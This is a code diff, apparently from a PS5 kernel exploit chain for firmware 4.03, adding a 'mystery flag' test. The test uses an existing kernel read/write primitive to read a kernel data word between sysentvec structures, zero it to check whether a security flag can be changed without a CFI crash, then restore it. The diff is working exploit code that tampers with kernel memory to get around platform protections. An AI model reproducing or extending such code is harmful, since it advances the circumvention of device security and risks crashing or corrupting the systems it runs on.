@@ -612,6 +612,64 @@ async function main(userlandRW, wkOnly = false) {
         }
 
         ///////////////////////////////////////////////////////////////////////
+        // MYSTERY FLAG TEST - Data at 0xD11D08 (between sysentvec structures)
+        // Found via kernel_data.bin analysis - this is a DATA field, not func ptr
+        ///////////////////////////////////////////////////////////////////////
+
+        const MYSTERY_FLAG_OFFSET = 0xD11D08;
+        const MYSTERY_MASK_OFFSET = 0xD11D0C;
+
+        let mysteryFlagAddr = krw.kdataBase.add32(MYSTERY_FLAG_OFFSET);
+        let mysteryMaskAddr = krw.kdataBase.add32(MYSTERY_MASK_OFFSET);
+
+        let mysteryFlagVal = await krw.read8(mysteryFlagAddr);
+        let mysteryMaskVal = await krw.read8(mysteryMaskAddr);
+
+        await log("[MYSTERY] kdataBase = 0x" + krw.kdataBase, LogLevel.INFO);
+        await log("[MYSTERY] Flag @ 0x" + mysteryFlagAddr + " = 0x" + (mysteryFlagVal.low >>> 0).toString(16), LogLevel.INFO);
+        await log("[MYSTERY] Mask @ 0x" + mysteryMaskAddr + " = 0x" + (mysteryMaskVal.low >>> 0).toString(16), LogLevel.INFO);
+        await log("[MYSTERY] Expected: Flag=0x1, Mask=0x0FFFFFFF", LogLevel.INFO);
+
+        let doMysteryTest = confirm(
+            "MYSTERY FLAG TEST\n\n" +
+            "Found data between sysentvec_ps5 and sysentvec_ps4:\n\n" +
+            "Flag @ 0x" + mysteryFlagAddr + "\n" +
+            "Current value: 0x" + (mysteryFlagVal.low >>> 0).toString(16) + "\n" +
+            "Expected: 0x00000001\n\n" +
+            "This is DATA (not a function pointer).\n" +
+            "CFI should NOT block this write.\n\n" +
+            "Click OK to try writing 0 to this flag.\n" +
+            "If NO CRASH = We found a writable security flag!"
+        );
+
+        if (doMysteryTest) {
+            await log("[MYSTERY] Writing 0 to mystery flag...", LogLevel.WARN);
+            await krw.write8(mysteryFlagAddr, new int64(0, mysteryFlagVal.hi));
+
+            // If we get here, no crash!
+            let verifyVal = await krw.read8(mysteryFlagAddr);
+            await log("[MYSTERY] After write: 0x" + (verifyVal.low >>> 0).toString(16), LogLevel.INFO);
+
+            if ((verifyVal.low >>> 0) === 0) {
+                await log("[MYSTERY] *** SUCCESS! Flag was modified without crash! ***", LogLevel.SUCCESS);
+
+                // Restore original
+                await krw.write8(mysteryFlagAddr, mysteryFlagVal);
+                await log("[MYSTERY] Restored original value", LogLevel.INFO);
+
+                alert(
+                    "SUCCESS!\n\n" +
+                    "The mystery flag at 0xD11D08 is WRITABLE!\n\n" +
+                    "Original value has been restored.\n\n" +
+                    "Next step: Test what happens when this flag stays 0\n" +
+                    "(might need to test with suspend/resume)"
+                );
+            } else {
+                await log("[MYSTERY] Write may have been blocked. Value: 0x" + (verifyVal.low >>> 0).toString(16), LogLevel.WARN);
+            }
+        }
+
+        ///////////////////////////////////////////////////////////////////////
         // APIC READ TEST - Verify apic_ops offset (FW 4.03)
         ///////////////////////////////////////////////////////////////////////
 
